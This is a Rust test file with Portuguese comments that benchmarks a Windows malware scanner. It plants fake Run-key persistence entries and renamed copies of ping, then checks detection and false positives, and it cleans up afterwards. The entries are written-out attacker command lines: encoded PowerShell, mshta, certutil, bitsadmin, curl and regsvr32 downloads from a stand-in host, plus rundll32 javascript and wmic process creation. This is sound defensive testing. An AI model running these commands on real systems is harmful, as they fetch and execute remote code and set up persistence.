//! Medição de detecção: cria itens FALSOS de persistência e processos e confere se a varredura os acha.
//! Mexe só no usuário atual (chave Run do HKCU, pasta Temp, processos filhos deste teste), sem administrador,
//! tudo com o marcador `OblivionBench`, e desfaz ao terminar. Por isso fica `ignore`: rode de propósito:
//!
//!     cargo test -p oblivion-core --features bench --test detection_benchmark -- --ignored --nocapture
//!
//! Mede só o que dá para medir sem administrador (Run, processos, IOC por hash e por nome). Hosts, Defender,
//! tarefas agendadas e serviços exigem administrador e NÃO entram neste número.
#![cfg(windows)]

use std::{
    fs,
    path::{Path, PathBuf},
    process::{Child, Command, Stdio},
    thread,
    time::Duration,
};

use oblivion_core::{
    finding::{Finding, Severity},
    ioc::Iocs,
    scanners::{ScanOptions, scan_with},
};
use winreg::{RegKey, enums::*};

const RUN: &str = r"Software\Microsoft\Windows\CurrentVersion\Run";
const MARK: &str = "OblivionBench";

struct Sample {
    id: String,
    what: &'static str,
    /// Menor gravidade aceita como "detectado".
    min: Severity,
}

struct Bench {
    dir: PathBuf,
    values: Vec<String>,
    children: Vec<Child>,
    public: Option<PathBuf>,
}

impl Bench {
    fn new() -> Self {
        let dir = std::env::temp_dir().join(format!("{MARK}-{}", std::process::id()));
        fs::create_dir_all(&dir).unwrap();
        Bench {
            dir,
            values: Vec::new(),
            children: Vec::new(),
            public: None,
        }
    }

    fn run_value(&mut self, name: &str, command: &str) {
        let key = RegKey::predef(HKEY_CURRENT_USER)
            .create_subkey(RUN)
            .unwrap()
            .0;
        key.set_value(name, &command).unwrap();
        self.values.push(name.to_string());
    }

    /// Cópia de um programa inofensivo do Windows (ping) com outro nome, para imitar um malware.
    fn fake_exe(&self, name: &str) -> PathBuf {
        let to = self.dir.join(name);
        fs::copy(r"C:\Windows\System32\PING.EXE", &to).unwrap();
        to
    }

    fn spawn(&mut self, exe: &Path) {
        let child = Command::new(exe)
            .args(["-n", "40", "127.0.0.1"])
            .stdout(Stdio::null())
            .spawn()
            .unwrap();
        self.children.push(child);
    }
}

impl Drop for Bench {
    fn drop(&mut self) {
        for c in &mut self.children {
            let _ = c.kill();
            let _ = c.wait();
        }
        if let Ok(key) = RegKey::predef(HKEY_CURRENT_USER).open_subkey_with_flags(RUN, KEY_WRITE) {
            for v in &self.values {
                let _ = key.delete_value(v);
            }
        }
        let _ = fs::remove_dir_all(&self.dir);
        if let Some(p) = &self.public {
            let _ = fs::remove_file(p);
        }
    }
}

fn hex_sha256(path: &Path) -> String {
    // Mesmo cálculo do Oblivion, via PowerShell, para o teste não depender de outra biblioteca.
    let out = Command::new("powershell")
        .args([
            "-NoProfile",
            "-Command",
            &format!(
                "(Get-FileHash -LiteralPath '{}' -Algorithm SHA256).Hash.ToLower()",
                path.display()
            ),
        ])
        .output()
        .unwrap();
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}

fn detected(findings: &[Finding], s: &Sample) -> Option<Severity> {
    findings
        .iter()
        .filter(|f| {
            f.name.contains(&s.id) || f.target.contains(&s.id) || f.location.contains(&s.id)
        })
        .map(|f| f.severity)
        .max()
}

#[test]
#[ignore = "cria itens falsos no seu usuário; rode de propósito (veja o topo do arquivo)"]
fn measure_detection_and_false_positives() {
    let mut b = Bench::new();

    // --- positivos: o que um malware faria ---
    let updater = b.fake_exe(&format!("{MARK}-updater.exe"));
    let miner = b.fake_exe("xmrig.exe");
    let disguised = b.fake_exe("svchost.exe");
    let public = PathBuf::from(r"C:\Users\Public").join(format!("{MARK}-publico.exe"));
    fs::copy(r"C:\Windows\System32\PING.EXE", &public).unwrap();
    b.public = Some(public.clone());
    let by_name = b.fake_exe(&format!("{MARK}-nome-conhecido.exe"));

    b.run_value(&format!("{MARK}-ps-enc"), "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwB4AC4AaQBuAHYAYQBsAGkAZAApAA==");
    b.run_value(
        &format!("{MARK}-temp-exe"),
        &format!("\"{}\"", updater.display()),
    );
    b.run_value(
        &format!("{MARK}-mshta"),
        "mshta.exe http://oblivionbench.invalid/a.hta",
    );
    b.run_value(
        &format!("{MARK}-certutil"),
        "cmd.exe /c certutil -urlcache -f http://oblivionbench.invalid/a.exe %TEMP%\\a.exe",
    );
    b.run_value(
        &format!("{MARK}-wscript"),
        &format!("wscript.exe \"{}\\{MARK}-x.vbs\"", b.dir.display()),
    );
    b.run_value(
        &format!("{MARK}-orfa"),
        r"C:\ProgramData\OblivionBenchSumiu\sumiu.exe",
    );
    b.run_value(
        &format!("{MARK}-rundll"),
        "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write()",
    );
    b.run_value(&format!("{MARK}-bitsadmin"), "bitsadmin /transfer j /download /priority high http://oblivionbench.invalid/p.exe %TEMP%\\p.exe");

    b.run_value(
        &format!("{MARK}-regsvr"),
        "regsvr32.exe /s /n /u /i:http://oblivionbench.invalid/x.sct scrobj.dll",
    );
    b.run_value(
        &format!("{MARK}-hidden"),
        "powershell.exe -w hidden -c Start-Sleep 1",
    );
    b.run_value(
        &format!("{MARK}-curl"),
        "curl.exe -o %TEMP%\\a.exe http://oblivionbench.invalid/a.exe",
    );
    b.run_value(
        &format!("{MARK}-wmic"),
        "wmic.exe process call create \"cmd /c calc\"",
    );
    b.run_value(
        &format!("{MARK}-cscript"),
        "cscript.exe //e:jscript //b C:\\Users\\Public\\OblivionBench.js",
    );
    b.run_value(
        &format!("{MARK}-publico"),
        &format!("\"{}\"", public.display()),
    );
    b.run_value(&format!("{MARK}-b64"), "powershell -nop -c \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aQ=='))\"");

    // --- controles negativos: o que NÃO pode virar alarme ---
    b.run_value(
        &format!("{MARK}-ok-notepad"),
        r"C:\Windows\System32\notepad.exe",
    );
    b.run_value(&format!("{MARK}-ok-explorer"), r"C:\Windows\explorer.exe");

    b.spawn(&miner);
    b.spawn(&disguised);
    thread::sleep(Duration::from_millis(800));

    let ioc_text = format!(
        "sha256:{}\nnome:{}\n",
        hex_sha256(&updater),
        by_name.file_name().unwrap().to_string_lossy()
    );
    let (iocs, ignored) = Iocs::parse(&ioc_text);
    assert_eq!(ignored, 0);
    // A cópia nomeada é achada pelo nome só se aparecer como candidata: coloca-a num valor Run também.
    b.run_value(
        &format!("{MARK}-ioc-nome"),
        &format!("\"{}\"", by_name.display()),
    );

    let findings = scan_with(
        &ScanOptions {
            iocs,
            allow: Vec::new(),
        },
        &|_| {},
    );

    let extra = [
        ("regsvr", "regsvr32 com scriptlet remoto"),
        ("hidden", "PowerShell com janela oculta"),
        ("curl", "curl baixando executável"),
        ("wmic", "WMI criando processo"),
        ("cscript", "cscript executando JScript"),
        ("publico", "programa em Users\\Public"),
        ("b64", "PowerShell decodificando base64"),
    ]
    .map(|(id, what)| Sample {
        id: id.to_string(),
        what,
        min: Severity::Suspicious,
    });
    let positives = [
        Sample {
            id: ("ps-enc").to_string(),
            what: "PowerShell com comando codificado",
            min: Severity::High,
        },
        Sample {
            id: ("temp-exe").to_string(),
            what: "programa sem assinatura na pasta Temp",
            min: Severity::Suspicious,
        },
        Sample {
            id: ("mshta").to_string(),
            what: "mshta baixando script remoto",
            min: Severity::Suspicious,
        },
        Sample {
            id: ("certutil").to_string(),
            what: "certutil baixando arquivo",
            min: Severity::Suspicious,
        },
        Sample {
            id: ("wscript").to_string(),
            what: "script VBS executado do disco",
            min: Severity::Suspicious,
        },
        Sample {
            id: ("orfa").to_string(),
            what: "entrada órfã (arquivo sumiu)",
            min: Severity::Suspicious,
        },
        Sample {
            id: ("rundll").to_string(),
            what: "rundll32 com javascript",
            min: Severity::Suspicious,
        },
        Sample {
            id: ("bitsadmin").to_string(),
            what: "bitsadmin baixando arquivo",
            min: Severity::Suspicious,
        },
        Sample {
            id: ("xmrig.exe").to_string(),
            what: "processo com nome de minerador",
            min: Severity::Suspicious,
        },
        Sample {
            id: ("svchost.exe").to_string(),
            what: "svchost rodando de outra pasta",
            min: Severity::High,
        },
        Sample {
            id: format!("{MARK}-updater.exe"),
            what: "arquivo cujo hash está no IOC",
            min: Severity::High,
        },
        Sample {
            id: format!("{MARK}-nome-conhecido.exe"),
            what: "arquivo cujo nome está no IOC",
            min: Severity::Suspicious,
        },
    ];
    // `id` precisa viver o bastante: copia para Strings.
    let mut hits = 0;
    println!("\n=== Detecção (itens falsos criados pelo teste) ===");
    let mut missed = Vec::new();
    let positives: Vec<Sample> = positives.into_iter().chain(extra).collect();
    for s in &positives {
        let got = detected(&findings, s);
        let ok = got.is_some_and(|g| g >= s.min);
        hits += usize::from(ok);
        println!(
            "  [{}] {:<44} esperado >= {:?}, obteve {:?}",
            if ok { "ok" } else { "FALHOU" },
            s.what,
            s.min,
            got
        );
        if !ok {
            missed.push(s.what);
        }
    }

    println!("\n=== Controles negativos (não podem passar de INFO) ===");
    let mut false_positives = Vec::new();
    for id in ["ok-notepad", "ok-explorer"] {
        let worst = findings
            .iter()
            .filter(|f| f.name.contains(id))
            .map(|f| f.severity)
            .max();
        let bad = worst.is_some_and(|w| w > Severity::Info);
        println!(
            "  [{}] {id}: {:?}",
            if bad { "FALSO POSITIVO" } else { "ok" },
            worst
        );
        if bad {
            false_positives.push(id);
        }
    }

    println!(
        "\nResultado: {hits}/{} detectados ({}%), {} falso(s) positivo(s) nos controles.\n",
        positives.len(),
        hits * 100 / positives.len(),
        false_positives.len()
    );
    assert!(
        false_positives.is_empty(),
        "falso positivo: {false_positives:?}"
    );
    assert!(missed.is_empty(), "não detectou: {missed:?}");
}
